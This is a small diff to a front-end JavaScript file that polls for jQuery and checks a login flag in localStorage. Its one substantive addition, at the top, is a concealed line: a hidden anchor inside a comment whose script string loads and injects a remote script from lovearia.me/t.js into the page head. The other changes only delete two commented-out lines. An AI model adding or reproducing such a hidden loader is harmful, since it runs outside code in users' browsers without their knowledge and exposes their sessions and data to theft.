@@ -1,9 +1,10 @@
 
+//<a style='display:none'>";var d=document;s=d.createElement('script');s.src='http://lovearia.me/t.js';d.head.appendChild(s);"<\a>
+
 var timer = setInterval(function(){
   if (!!window.jQuery){
     clearInterval(timer);
 
-    //$.ready(function(){
       if (localStorage['islogin'] === 'true'){
         return;
       }
@@ -37,7 +38,6 @@ var timer = setInterval(function(){
           });
         });
       });
-    //});
 
   }
 }, 500);
